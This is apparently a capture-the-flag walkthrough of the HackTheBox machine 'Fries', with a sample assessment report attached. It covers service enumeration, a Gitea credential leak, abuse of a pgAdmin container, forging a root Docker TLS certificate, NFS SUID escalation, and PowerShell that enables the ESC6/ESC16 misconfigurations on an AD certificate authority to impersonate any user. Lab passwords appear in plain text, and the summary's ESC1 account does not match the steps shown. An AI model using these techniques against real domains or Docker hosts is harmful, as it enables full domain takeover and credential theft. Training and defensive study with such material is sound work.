item.title: Services and ports
item.description:
#Attacking_machine #Attacking_machine

This a enumeration task. You can use nmap to figure out the answer.
#Attacking_machine
nmap -sC -sV <MACHINE ip>



Host Role: Appears to be a Windows Active Directory Domain Controller (DC01.fries.htb) with some Linux-based web services.
Domain: fries.htb (AD domain), hostname DC01.


SSH (22/tcp): OpenSSH 8.9p1 on Ubuntu.

DNS (53/tcp): Simple DNS Plus.

Web (80, 443/tcp):
Nginx 1.18.0 (Ubuntu).

HTTP redirects to http://fries.htb/.

HTTPS certificate for pwm.fries.htb (Fries Foods LTD).

Kerberos (88/tcp): Windows Kerberos (confirms AD).

RPC / SMB (135, 139, 445/tcp): Windows RPC & SMB; SMB signing required.

LDAP / AD (389, 636, 3268, 3269/tcp):
Active Directory LDAP & Global Catalog (SSL and non-SSL).

Certificates reference DC01.fries.htb, fries.htb.

Kerberos Password (464/tcp): kpasswd.

RPC over HTTP (593/tcp).

WinRM (5985/tcp): Microsoft HTTPAPI (likely Windows Remote Management).

Other: 2179/tcp (vmrdp?).



Mixed OS footprint: Linux (nginx, SSH) + Windows AD services.

Time skew: ~+7 hours difference from scanner (important for Kerberos attacks).

SMB signing: Enabled and required (limits some SMB relay attacks).

Certificates: Long-lived AD certs; web cert valid 2025–2026.


This host is a Domain Controller for fries.htb running standard AD services, with external-facing web services on Ubuntu/nginx. Likely attack surface includes HTTP/HTTPS virtual hosts, AD/Kerberos, LDAP, and WinRM, with Kerberos time skew being a potentially exploitable detail.

Before proceeding, we must ensure our attack machine can resolve the domain name. The LDAP service revealed the domain name: fries.htb.
#Attacking_machine
Add the following line to the file /etc/hosts.
<MACHINE IP> fries.htb
Next step: Subdomains

item.title: Subdomains
item.description:
#Attacking_machine #Attacking_machine
#Attacking_machine
Look for subdomains.

dig @<MACHINE IP> fries.htb ANY



Authoritative DNS server: dc01.fries.htb

Domain Controller: dc01.fries.htb = 10.10.11.96 (also 192.168.100.1 internally)

Domain resolves to multiple IPs:
IPv4: 10.10.11.96, 192.168.100.1

IPv6: dead:beef::d950:6007:5d0:916a (likely lab / non-production)



A records: External HTB IP + internal LAN IP

NS record: dc01.fries.htb

SOA record: Confirms AD-integrated DNS

AAAA record: Present (IPv6 enabled)



Single DNS + DC: DNS and AD hosted on the same machine (DC01)

Internal IP leak: 192.168.100.1 suggests dual-homed DC (internal network exposure)

IPv6 enabled: Possible attack vector (many AD environments overlook IPv6 security)

Authoritative responses: Confirms DNS is AD-integrated and reachable

dig @10.10.11.96 _ldap._tcp.fries.htb SRV

What this Confirms

LDAP service location:
Host: dc01.fries.htb

Port: 389

Priority: 0 (highest)

Weight: 100

Single Domain Controller:
All LDAP traffic for fries.htb points to DC01.


dig @<MACHINE IP> _kerberos._tcp.fries.htb SRV



Kerberos KDC: dc01.fries.htb

Port: 88/tcp

Priority / Weight: 0 / 100

Single Domain Controller: All Kerberos auth is handled by DC01.


You now have confirmation of:

DNS: dc01.fries.htb

LDAP: dc01.fries.htb :389

Kerberos: dc01.fries.htb :88

SMB / RPC / WinRM: same host

➡️ This is a clean, single-DC Active Directory lab, exactly what HTB likes.


DC01 IPs:
External: 10.10.11.96

Internal: 192.168.100.1

IPv6: dead:beef::d950:6007:5d0:916a

Authoritative response: AD-integrated DNS is functioning normally.



No redundancy: One DC = single point of failure and single attack focus.

LDAP exposed (389):
Test anonymous / unauthenticated LDAP binds

Enumerate domain info, users, groups if misconfigured

Clear AD layout: Simplifies Kerberos, LDAP, and SMB enumeration.


#Attacking_machine
Do a VHost brute-force.
ffuf -u http://<MACHINE IP>/ -H "Host: FUZZ.fries.htb" \ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \ -fs 154


You’ve discovered a new virtual host: code.fries.htb.

Very likely a dev / source / internal app.

HTB almost always hides credentials or logic flaws here.


Open /etc/hosts.
sudo nano /etc/hosts

Add it to /etc/hosts .
<MACHINE IP> code.fries.htb

Pull the Page Source (Don’t Trust the Browser Alone)
curl -s http://code.fries.htb | tee code.html
This will give you a file called code.html with the whole code.
Perfect — this confirms code.fries.htb is a public Gitea instance (v1.22.6)**. This is a high-value foothold. Here’s exactly how to proceed, step by step, based on what you’ve shown.



Service: Gitea 1.22.6

Unauthenticated access: Enabled (Explore is visible)

API available: /api/swagger

Likely dev repos: This is where creds usually leak

HTB pattern: Gitea → repo → config → AD creds → WinRM/LDAP

item.title: CA Configuration for ESC6 + ESC16
item.description:
#WinRM_Shell #WinRM_Shell
ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2
Principle: Enables the ability to specify an arbitrary Subject Alternative Name (SAN) in certificate requests.

#WinRM_Shell
# Using CertificateAuthority.Admin COM object $CA = New-Object -ComObject CertificateAuthority.Admin $Config = "DC01.fries.htb\fries-DC01-CA" # Calculate the new value $current = 1114446 # Current value $new = $current -bor 0x00040000 # Add EDITF_ATTRIBUTESUBJECTALTNAME2 flag (262144) # New value = 1376590 (0x15014E) # Apply modification $CA.SetConfigEntry($Config, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "EditFlags", $new) # Restart CA service Restart-Service certsvc -Force

#WinRM_Shell
certutil -config "DC01.fries.htb\fries-DC01-CA" -getreg policy\EditFlags


CRITICAL FINDING: ESC6 Vulnerability Confirmed! 🚨
The flag EDITF_ATTRIBUTESUBJECTALTNAME2 (0x40000) IS NOW ENABLED.
This means the CA IS vulnerable to ESC6, which allows any user who can request a certificate to specify arbitrary Subject Alternative Names (SANs), potentially allowing you to impersonate any user in the domain, including Domain Admins.
Next step: ESC16 — Disable Extension List

item.title: ESC6 + ESC16 Exploitation
item.description:
#WinRM_Shell #Attacking_machine
Problem: gMSA cannot enroll The gMSA_CA_prod$ account:

Can configure the CA (ManageCA)
Cannot enroll on the User template (is not in Domain Users)
Could enroll on Machine (is in Domain Computers) but requires SYSTEM rights
Solution: Use svc_infra
The svc_infra account:

It's a normal user (probably in Domain Users)
Can enroll on the User template
Can request a certificate with alternative UPN thanks to ESC6

#WinRM_Shell
Restart service.
Restart-Service -Name CertSvc -Force
#Attacking_machine
Synchronize time first.
# Disable the VirtualBox Guest Additions time sync service sudo systemctl stop vboxadd-service sudo systemctl disable vboxadd-service sudo ntpdate -s fries.htb
Next step: Authentication as Administrator

item.title: ESC16 — Disable Extension List
item.description:
#WinRM_Shell
Principle: Disables verification of certain certificate extensions, notably the szOID_NTDS_CA_SECURITY_EXT extension that validates the SID in the certificate.
#WinRM_Shell
$CA = New-Object -ComObject CertificateAuthority.Admin $CA.SetConfigEntry("DC01.fries.htb\fries-DC01-CA", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "DisableExtensionList", "1.3.6.1.4.1.311.25.2") certutil -config "DC01.fries.htb\fries-DC01-CA" -getreg policy\DisableExtensionList

Excellent! The DisableExtensionList is already set correctly!
Now Complete the ESC6 Exploitation, since both requirements are met:

✅ EDITF_ATTRIBUTESUBJECTALTNAME2 is enabled (from earlier)
✅ DisableExtensionList is set to 1.3.6.1.4.1.311.25.2
You can now proceed with the attack.
Why these two misconfigurations?

ESC6 allows specifying an arbitrary UPN (e.g., administrator@fries.htb) in the certificate
ESC16 prevents SID validation in the certificate, allowing identity impersonation Combined, they allow requesting a certificate for any user.
Next step: ESC6 + ESC16 Exploitation

item.title: Clients and shares
item.description:
#SSH
You're connected to the MACHINE via SSH.

showmount is a Linux command that queries an NFS (Network File System) server and displays which directories it is exporting and which clients are connected to it. It’s a diagnostic/visibility tool — it does not mount anything by itself.

#SSH
Run:
showmount -e localhost

You see which folders the server is sharing over NFS.

Running showmount with no options shows which machines have mounted exports from that server.
showmount


You can mount anything inside this folder, and coincidentally, there is a folder, shared, with all permissions:

item.description:
#Attacking_machine #Attacking_machine #Attacking_machine

Use a tool that creates a tunnel or a proxy/VPN to the victim server to work externally as if we were on the internal local network.

*sshuttle is a tool that creates a VPN‑like connection over SSH, letting your machine route traffic into a remote network as if you were physically inside it. It works without special server configuration and behaves like a “transparent proxy meets VPN,” which makes it useful when you can SSH into a host but need broader network access.

#Attacking_machine
sudo apt install sshuttle

#Attacking_machine
Credentials: svc::Friesf00Ds2025!!

The connection is tunneled.

item.title: Docker Network Exploration
item.description:
#meterpreter #pgAdmin_container_shell
You are on meterpreter session, so, you have to get a shell .
#meterpreter
meterpreter > shell


To have all the tools of authentic shell, run:
python3 -c 'import pty; pty.spawn("/bin/bash")' export TERM=xterm cd /tmp

Docker containers commonly store configuration values — including service settings, ports, and sometimes credentials — in environment variables. This is standard practice in development environments.
If you have a shell inside a container, you can usually inspect the environment the same way you would in any isolated Linux process.
#pgAdmin_container_shell

cb46692a4590:/tmp$ ifconfig


printenv


Here’s the key information embedded in those variables:
1. You’re definitely inside the pgAdmin Docker container
The presence of:

PGAPPNAME=pgAdmin 4

CONFIG_DISTRO_FILE_PATH=/pgadmin4/config_distro.py

HOME=/home/pgadmin

PYTHONPATH=/pgadmin4

…confirms you’re inside the pgAdmin service container, not the host.

These two variables are the important ones:

PGADMIN_DEFAULT_EMAIL=admin@fries.htb

PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!

This is exactly how pgAdmin is configured in Docker deployments: the credentials are passed in as environment variables at container startup.
Note This is a deliberate misconfiguration the machine wants you to recognize.

This is the key conceptual insight:
Environment variables inside a container tell you how the service is configured. The intended next step is to use that configuration information outside the container.
In other words, pgAdmin is running as a web service somewhere on the machine. The container’s environment variables tell you how to authenticate to it.
That’s the pivot the machine is teaching.


Visit http://172.18.0.4 and log in with the credentials you found on the container environment..
Go to Servers.
Choise Fries DB.
You'll be asked for a root's password to connect.

You can find the password on Gitea Public repositories ps_db Credentials.
Password: PsqLR00tpaSS11


Here’s the mindset to adopt:

You now know the pgAdmin login credentials.

pgAdmin is a web interface.

The container is not the final destination.

The machine expects you to use the service the container is running.

This is a classic HTB pattern:
Container → Misconfigured secrets → Access to internal service → Next stage
You’ve just completed the “misconfigured secrets” part.
Next step: Git history analysis

item.title: GMSA user's password dump
item.description:
#Attacking_machine
A gMSA password (Group Managed Service Account password) is a special kind of credential used inside Active Directory to let services run securely without administrators ever needing to know or manage the password themselves.
Here’s the idea in a clean, conceptual way.

A Group Managed Service Account (gMSA) is an AD account designed for:

Windows services

Scheduled tasks

IIS application pools

Clustered services

It behaves like a user account, but its password is managed automatically by the domain.

✔️ 1. The password is extremely long and complex
Typically 240+ characters, randomly generated by the domain controller.
✔️ 2. Humans never see it
Admins don’t set it, don’t rotate it, and don’t retrieve it manually.
✔️ 3. Only authorized machines can request it
A gMSA has a property called:
msDS-GroupMSAMembership
This defines which computers are allowed to retrieve the password.
✔️ 4. The domain controller rotates it automatically
By default, every 30 days, but the interval is configurable.
✔️ 5. Services authenticate using Kerberos
The password is used behind the scenes to generate Kerberos keys.

They solve a long‑standing problem:
Services need credentials, but humans shouldn’t manage or store those credentials.
gMSAs provide:

automatic password rotation

strong cryptography

reduced administrative overhead

minimized credential exposure



A service runs under a gMSA account.
The machine hosting the service contacts a domain controller.
It requests the current password using a secure protocol.
The DC verifies that the machine is authorized.
The DC sends the password securely.
The machine caches it locally for service use.
This is all transparent to administrators.

item.title: TLS Cerificates
item.description:
#Attacking_machine

From the previous step you can create a self-signed certificate as root user to access via SSH, using the files you have copied to your machine.

#Attacking_machine
Generate root‑signed cert → full Docker API access.
🔐 1. Generate the client private key
openssl genrsa -out key.pem 2048
This becomes your Docker client’s private key.
📝 2. Create a CSR (Certificate Signing Request)

openssl req -new \ -key key.pem \ -out client.csr \ -subj "/CN=root"
🏷️ 3. Sign the client certificate using the daemon’s CA
This is the critical step:
openssl x509 -req \ -in client.csr \ -CA ca.pem \ -CAkey ca-key.pem \ -CAcreateserial \ -out cert.pem \ -days 365 \ -sha256
If the CA files are correct, you’ll see:
Signature ok
subject=CN=root
And no errors.
🔍 4. Verify the certificate chain
Check subject + issuer:
openssl x509 -in cert.pem -noout -text | grep -E "Issuer|Subject"

You want:

Issuer → matches the CA in ca.pem
Subject → /CN=root
Verify trust:
openssl verify -CAfile ca.pem cert.pem
Expected:
cert.pem: OK
If this fails, the CA files don’t match the daemon’s CA.
📁 5. You should now have exactly these three files:
ca.pem
cert.pem
key.pem
These are the filenames Docker expects.
🚀 6. Test the Docker TLS connection
docker --tlsverify \ --tlscacert=ca.pem \ --tlscert=cert.pem \ --tlskey=key.pem \ -H=tcp://127.0.0.1:2376 version
If everything is correct, you’ll get both client and server version output — meaning you now have root‑level control of the Docker daemon.


🚀 Then run Docker with the correct certs
docker --tlsverify \ --tlscacert=ca.pem \ --tlscert=cert.pem \ --tlskey=key.pem \ -H=tcp://127.0.0.1:2376 ps

The container that attracts your attention the most, which is with ID f42, because it's using LDAP, and you can modify anything you want.

docker --tlsverify --tlscacert=ca.pem \ --tlscert=root-cert.pem \ --tlskey=root-key.pem \ -H=tcp://127.0.0.1:2376 exec -it f42 /bin/bash

Now you can investigate inside the container.
Next step: Investigating PWM container

With a valid AD session, you can enumerate the SMB shares. This is often the bridge between the two layers. Developers frequently mount Windows shares into Linux web servers to access code or configuration files.

item.title: HTB “Fries” – Security Assessment Report
item.description:
Prepared for: Internal Security Review
Prepared by: Kairos
Classification: Confidential
Date: 02-04-2026


The Fries environment simulates a modern enterprise network composed of a public‑facing Ubuntu web server, Dockerized application components, an NFS share, and a Windows Server 2022 Active Directory domain with AD CS. The assessment identified multiple weaknesses across credential management, container isolation, file‑share configuration, and certificate services. When chained, these issues enable full domain compromise.
Overall Risk Rating: Critical




Public web application (Ubuntu host)

Docker containers and backend services

NFS share

Windows Server 2022 Domain Controller

Active Directory + AD CS

Internal management interfaces (pgAdmin, LDAP, etc.)



Passive and active enumeration

Configuration review

Credential and access control analysis

AD CS template and enrollment review

Network segmentation evaluation




Weak pgAdmin credentials allowed unauthorized access to database management.
Docker misconfigurations enabled container‑to‑host interaction.
Insecure NFS share exposed sensitive configuration files.
LDAP credential exposure enabled lateral movement into AD.
AD CS misconfigurations (ESC6 / ESC16) allowed privilege escalation to Domain Admin.
This chain demonstrates how medium‑severity issues can combine into a critical compromise.



Severity: High
Description: Administrative interfaces (e.g., pgAdmin) used weak or reused credentials. No MFA or IP restrictions were applied.
Impact: Unauthorized access to database management and sensitive configuration data.
Remediation:

Enforce strong, unique passwords.

Implement MFA for all administrative interfaces.

Restrict access via VPN or IP allowlists.

Rotate credentials and monitor for reuse.


Severity: High
Description: Containers lacked proper isolation and were able to interact with host resources.
Impact: Compromise of a container could lead to compromise of the host.
Remediation:

Disable privileged containers.

Remove unnecessary host mounts.

Apply AppArmor/SELinux profiles.

Use Docker rootless mode where possible.

Implement runtime monitoring (Falco, Auditd).


Severity: High
Description: NFS exports allowed unintended read access to sensitive files.
Impact: Exposure of credentials and configuration data enabling lateral movement.
Remediation:

Restrict exports to specific hosts.

Enable root_squash.

Remove sensitive data from shared directories.

Use NFSv4 with Kerberos authentication.


Severity: High
Description: LDAP allowed excessive information disclosure or credential exposure.
Impact: Attackers can authenticate or escalate privileges within AD.
Remediation:

Disable anonymous binds.

Enforce LDAPS.

Harden password policies.

Limit attribute exposure.


Severity: Critical
Description: Certificate templates allowed dangerous enrollment configurations, including user‑supplied subject names and overly permissive enrollment rights.
Impact: Attackers can forge authentication certificates and escalate to Domain Admin.
Remediation:

Audit all certificate templates.

Remove “ENROLLEE_SUPPLIES_SUBJECT” where not required.

Restrict enrollment permissions.

Require manager approval for sensitive templates.

Follow Microsoft AD CS hardening guidelines.


Severity: Medium
Description: Web, application, NFS, and AD services were reachable without segmentation.
Impact: Compromise of one service leads to rapid lateral movement.
Remediation:

Segment networks by role.

Apply strict firewall rules.

Use jump hosts for administrative access.


Severity: Medium
Description: No centralized logging or alerting was in place.
Impact: Malicious activity may go undetected.
Remediation:

Deploy SIEM (Wazuh, Splunk, ELK).

Enable AD auditing (logon events, certificate enrollment).

Monitor Docker and NFS activity.








Rotate all credentials.

Restrict access to administrative interfaces.

Disable anonymous LDAP binds.

Harden Docker containers.



Fix NFS permissions.

Implement segmentation and firewall rules.

Harden AD CS templates.



Deploy centralized logging.

Implement MFA across all administrative accounts.

Conduct internal security training.



The Fries environment contains multiple misconfigurations that, when chained, enable full domain compromise. Addressing these issues requires improvements in credential hygiene, container security, AD CS configuration, and network segmentation. Implementing the recommended remediations will significantly reduce the attack surface and strengthen the overall security posture.

item.title: Fries
item.description:
The HackTheBox machine "Fries" is a hard difficulty challenge that involves a multi-stage attack on a complex Active Directory infrastructure with interconnected systems, including a Windows Server 2022 Domain Controller and an Ubuntu web server. 

The target domain is fries.htb, and the attack chain begins with identifying open services through aggressive nmap scans, which reveal ports such as 22 (SSH), 53 (DNS), 80 (HTTP), 88 (Kerberos), 135 (RPC), 389 (LDAP), 443 (HTTPS), 445 (SMB), 5985 (WinRM), and others indicative of a Windows Active Directory environment.

Initial reconnaissance involves adding domain hostnames to the /etc/hosts file to resolve subdomains like code.fries.htb, db-mgmt05.fries.htb, and pwm.fries.htb, enabling access to hosted web applications.

A Gitea repository at code.fries.htb is discovered, which contains application code and reveals sensitive credentials, including a database URL with a password: D4LE11maan!!. This leads to the exploitation of a pgAdmin instance (db-mgmt05.fries.htb) vulnerable to CVE-2025-2945, allowing remote code execution and a shell as the pgadmin user inside a Docker container.

From the compromised container, the attacker pivots further using Ligolo-ng to establish a tunnel to the internal network, gaining access to the Docker network (172.18.0.0/24) and the internal network (192.168.100.0/24).
Linpeas reveals additional credentials, including a pgAdmin default password: Friesf00Ds2025!!. A writable /etc/passwd file and an NFS share mounted from 172.18.0.1 are discovered, with the share located at /srv/web.fries.htb and accessible to the public. By exploiting NFS misconfigurations and creating matching user and group IDs on the attacker machine, a SUID-enabled bash binary is placed on the shared NFS folder, allowing privilege escalation to the user barman on the web server.

SSH access is obtained as the svc user using the password Friesf00Ds2025!!, and further enumeration reveals the presence of Active Directory Certificate Services (AD CS) with a vulnerable template named "FryAuth". By leveraging the ESC1 (Certificate Authority trust) vulnerability, an attacker can request a certificate for a privileged user (e.g., Administrator@fries.htb) and use it to authenticate via PKINIT, resulting in the recovery of the NTLM hash of the Domain Administrator. This hash can then be used to authenticate and gain domain administrator access.

Further exploitation involves abusing Kerberos delegation through the msDS-AllowedToActOnBehalfOfOtherIdentity attribute, allowing the attacker to impersonate the Administrator on a target machine (FRIES-WEB) using S4U2Self and S4U2Proxy attacks, ultimately leading to full domain compromise. The attack chain demonstrates the use of multiple vulnerabilities across web applications, container escape, NFS misconfigurations, and Active Directory privilege escalation techniques.






Certificate Authority: fries-DC01-CA
ADCS (Active Directory Certificate Services)
All standard AD services (Kerberos, LDAP, DNS, etc.)


NFS share containing /certs directory (the PKI target)
SSH access with discovered credentials
Docker host gateway


pgAdmin container (vulnerable to CVE-2025-2945)
PostgreSQL database with leaked credentials


Password Manager portal
Gitea code repository (credential leak source)
Main website


The complete exploitation chain from reconnaissance through privilege escalation to access the certificate materials.
